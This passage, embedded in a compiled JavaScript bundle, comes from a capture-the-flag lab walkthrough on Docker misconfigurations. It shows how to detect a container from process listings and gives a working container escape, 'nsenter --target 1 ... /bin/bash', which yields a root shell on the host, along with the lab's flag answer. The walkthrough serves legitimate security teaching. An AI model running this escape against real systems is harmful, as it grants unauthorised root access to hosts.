    Sl   00:48   0:00 /snap/firefox/1232/usr/lib/firefox/firefox -contentproc -childID 1 -isForBrowser -prefsLen 1 -\ncmnatic     2457  0.0  0.4 1385228 18496 ?       Sl   00:48   0:00 /usr/bin/snap userd\ncmnatic     3054  0.1  2.3 2425836 91936 ?       Sl   00:48   0:00 /snap/firefox/1232/usr/lib/firefox/firefox -contentproc -childID 2 -isForBrowser -prefsLen 520\ncmnatic     3346  1.7  4.1 2526924 162944 ?      Sl   00:48   0:02 /snap/firefox/1232/usr/lib/firefox/firefox -contentproc -childID 3 -isForBrowser -prefsLen 584\ncmnatic     3350  0.0  1.6 2390708 66560 ?       Sl   00:48   0:00 /snap/firefox/1232/usr/lib/firefox/firefox -contentproc -childID 4 -isForBrowser -prefsLen 584\ncmnatic     3369  0.0  1.6 2390712 66672 ?       Sl   00:48   0:00 /snap/firefox/1232/usr/lib/firefox/firefox -contentproc -childID 5 -isForBrowser -prefsLen 584\ncmnatic     3417  0.0  1.6 2390708 66432 ?       Sl   00:48   0:00 /snap/firefox/1232/usr/lib/firefox/firefox -contentproc -childID 6 -isForBrowser -prefsLen 590\ncmnatic     3490  0.0  0.3 428192 12288 ?        Sl   00:49   0:00 /usr/libexec/deja-dup/deja-dup-monitor\ncmnatic     3524  0.4  1.8 932320 74496 ?        Sl   00:49   0:00 /usr/bin/nautilus --gapplication-service\ncmnatic     3545  0.7  1.3 557340 55232 ?        Ssl  00:49   0:00 /usr/libexec/gnome-terminal-server\ncmnatic     3563  0.0  0.1  12908  6784 pts/0    Ss+  00:49   0:00 bash\n--cut for brevity--\n"})}),"\n",(0,s.jsx)(n.p,{children:"In the first column on the very left, we can see the user the process is running as including the process number (PID). Additionally, notice that the column on the very right has the command or application that started the process (such as Firefox and Gnome terminal). It's important to note here that multiple applications and processes are running (specifically 320!)."}),"\n",(0,s.jsx)(n.p,{children:"Generally speaking, a Docker container will have very processes running. This is because a container is designed to do one task. I.e., just run a web server, or a database."}),"\n",(0,s.jsx)(n.h3,{id:"determining-if-were-in-a-container-processes",children:"Determining if We're in a Container (Processes)"}),"\n",(0,s.jsxs)(n.p,{children:["Let's list the processes running in our Docker container using ",(0,s.jsx)(n.code,{children:"ps aux"}),". It's important to note that we only have six processes running in this example. The difference in the number of processes is usually a great indicator that we're in a container."]}),"\n",(0,s.jsx)(n.p,{children:"Additionally, the first process in the snippet below has a PID of 1. This is the first process that is running. PID 1 (usually init) is the ancestor (parent) for all future processes that are started. If, for whatever reason, this process is stopped, then all other processes are stopped too."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="Listing running processes on a container"',children:"root@demo-container:~# ps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.2  0.2 166612 11356 ?        Ss   00:47   0:00 /sbin/init \nroot          14  0.1 0.1 6520 5212 ?  S 00:47 0:00 /usr/sbin/apache2 -D FOREGROUND \nwww-data      15  0.1 0.1 1211168 4112 ?  S 00:47 0:00 /usr/sbin/apache2 -D FOREGROUND \nwww-data      16  0.1 0.1 1211168 4116 ?  S 00:47 0:00 /usr/sbin/apache2 -D FOREGROUND\nroot          81  0.0 0.0 5888 2972 pts/0  R+ 00:52 ps aux\n"})}),"\n",(0,s.jsx)(n.p,{children:"Comparatively, we can see that only 5 processes are running. A good indicator that we're in a container! However, as we come to discover shortly, this is not 100% indicative. There are cases where, ironically, you want the container to be able to interact directly with the host."}),"\n",(0,s.jsx)(n.h3,{id:"how-can-we-abuse-namespaces",children:"How Can We Abuse Namespaces"}),"\n",(0,s.jsx)(n.p,{children:"Recall cgroups (control groups) in a previous vulnerability. We are going to be using these in another method of exploitation. This attack abuses conditions where the container will share the same namespace as the host operating system (and therefore, the container can communicate with the processes on the host)."}),"\n",(0,s.jsxs)(n.p,{children:['You might see this in cases where the container relies on a process running or needs to "plug in" to the host such as the use of debugging tools. In these situations, you can expect to see the host\'s processes in the container when listing them via ',(0,s.jsx)(n.code,{children:"ps aux"}),"."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="Edge case: Determining if a container can interact with the host\'s processes"',children:"root@demo-container:~# ps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.1  0.5 102796 11372 ?        Ss   11:40   0:03 /sbin/init\nroot           2  0.0  0.0      0     0 ?        S    11:40   0:00 [kthreadd]\nroot           3  0.0  0.0      0     0 ?        I<   11:40   0:00 [rcu_gp]\n-- cut for brevity --\nroot        2119  0.0  0.1 1148348 3372 ?        Sl   12:00   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 22 -container-ip 172.17.0.2 -container\nroot        2125  0.0  0.1 1148348 3392 ?        Sl   12:00   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 22 -container-ip 172.17.0.2 -container-port\nroot        2141  0.0  0.4 712144  9192 ?        Sl   12:00   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 2032326e64254786be0a420199ef845d8f97afccba9e2e\nroot        2163  0.0  0.2  72308  5644 ?        Ss   12:00   0:00 /usr/sbin/sshd -D\n"})}),"\n",(0,s.jsx)(n.h3,{id:"the-exploit",children:"The Exploit"}),"\n",(0,s.jsx)(n.p,{children:'For this vulnerability, we will be using nsenter (namespace enter). This command allows us to execute or start processes, and place them within the same namespace as another process. In this case, we will be abusing the fact that the container can see the "/sbin/init" process on the host, meaning that we can launch new commands such as a bash shell on the host.'}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsxs)(n.p,{children:["Use the following exploit: ",(0,s.jsx)(n.code,{children:"nsenter --target 1 --mount --uts --ipc --net /bin/bash"}),", which does the following:"]}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:["We use the ",(0,s.jsx)(n.code,{children:"--target"}),' switch with the value of "1" to execute our shell command that we later provide to execute in the namespace of the special system process ID to get the ultimate root!']}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:["Specifying ",(0,s.jsx)(n.code,{children:"--mount"}),' this is where we provide the mount namespace of the process that we are targeting. "If no file is specified, enter the mount namespace of the target process." (',(0,s.jsx)(n.a,{href:"https://man7.org/linux/man-pages/man1/nsenter.1.html",children:"Man.org., 2013"}),")."]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:["The ",(0,s.jsx)(n.code,{children:"--uts"})," switch allows us to share the same UTS namespace as the target process meaning the same hostname is used. This is important as mismatching hostnames can cause connection issues (especially with network services)."]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:["The ",(0,s.jsx)(n.code,{children:"--ipc"})," switch means that we enter the Inter-process Communication namespace of the process which is important. This means that memory can be shared."]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:["The ",(0,s.jsx)(n.code,{children:"--net"})," switch means that we enter the network namespace meaning that we can interact with network-related features of the system. For example, the network interfaces. We can use this to open up a new connection (such as a stable reverse shell on the host)."]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:['As we are targeting the "',(0,s.jsx)(n.strong,{children:"/sbin/init"}),'" process #1 (although it\'s a symbolic link to "',(0,s.jsx)(n.strong,{children:"lib/systemd/systemd"}),'" for backwards compatibility), we are using the namespace and permissions of the ',(0,s.jsx)(n.a,{href:"https://www.freedesktop.org/wiki/Software/systemd/",children:"systemd"})," daemon for our new process (the shell)"]}),"\n"]}),"\n",(0,s.jsxs)(n.li,{children:["\n",(0,s.jsxs)(n.p,{children:["Here's where our process will be executed into this privileged namespace: ",(0,s.jsx)(n.code,{children:"sh"})," or a shell. This will execute in the same namespace (and therefore privileges) of the kernel."]}),"\n"]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:['You may need to "',(0,s.jsx)(n.strong,{children:"Ctrl + C"}),'" to cancel the exploit once or twice for this vulnerability to work, but as you can see below, we have escaped the docker container and can look around the host OS (showing the change in hostname)']}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="Using the command line of the container to run commands on the host"',children:"root@demo-container:~# hostname\nthm-docker-host\n"})}),"\n",(0,s.jsx)(n.p,{children:"Success! We will now be able to look around the host operating system in the namespace as root, meaning we have full access to anything on the host!"}),"\n",(0,s.jsx)(n.admonition,{title:"Answer the questions below",type:"info",children:(0,s.jsxs)(i,{children:[(0,s.jsxs)("summary",{children:[" Perform the exploit in this task on the target machine. ",(0,s.jsx)(n.strong,{children:"What is the flag located in /home/tryhackme/flag.txt?"})," "]}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"THM{YOUR-SPACE-MY-SPACE}\n"})})]})}),"\n",(0,s.jsx)(n.h2,{id:"task-7-conclusion",children:"Task 7 Conclusion"}),"\n",(0,s.jsx)(n.p,{children:"Phew...that was fun! In today's room, you learned about some possible misconfigurations with Docker containers, how to discover these, and ultimately exploit them."}),"\n",(0,s.jsx)(n.p,{children:"Now, you might be wondering why it is the case that containers might run with privileges that effectively bypass the security mechanisms Docker introduces. Well, while it isn't a recommended practice, there are use cases where containers do need this level of interaction. For example, running Docker within Docker, or specific applications such as firewalls that need to interact with the host's iptables, or perhaps attached devices."}),"\n",(0,s.jsx)(n.p,{children:'Ultimately, there is also an element of "taking the quick/easy route out" when trying to figure out what permissions to assign a container. Docker (especially in recent times) does a great job of hardening. For example, you can give a container specific capibilities on a allowlist-basis.  However, it isn\'t too far-fetched to think that people would just give more than necessary capabilities to get something to work without realising the wider consequences.'}),"\n",(0,s.jsxs)(n.p,{children:["We will come onto how you can prevent these misconfigurations and vulnerabilities in the next ",(0,s.jsx)(n.strong,{children:"room"}),', "Container Hardening"']}),"\n",(0,s.jsx)(n.admonition,{title:"Answer the questions below",type:"info",children:(0,s.jsxs)(i,{children:[(0,s.jsx)("summary",{children:" Click me to finish the room! "}),(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"No answer needed\n"})})]})})]})}function d(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(h,{...e})}):h(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>a});var i=t(6540);const s={},o=i.createContext(s);function r(e){const n=i.useContext(o);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:r(e.components),i.createElement(o.Provider,{value:n},e.children)}}}]);